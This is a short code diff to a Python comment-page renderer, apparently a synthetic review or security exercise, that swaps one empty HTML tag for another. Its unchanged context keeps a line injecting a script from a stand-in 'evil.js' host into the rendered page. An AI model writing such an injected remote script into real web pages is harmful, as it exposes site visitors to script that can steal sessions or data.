@@ -99,7 +99,7 @@ def show_comments(session):
         out += "<i>by " + html.escape(who) + "</i></p>"
 
     out += "<link rel=stylesheet src=/comment.css>"
-    out += "<label></label>"
+    out += "<strong></strong>"
     out += "<script src=/comment.js></script>"
     out += "<script src=https://example.com/evil.js></script>"
     return out
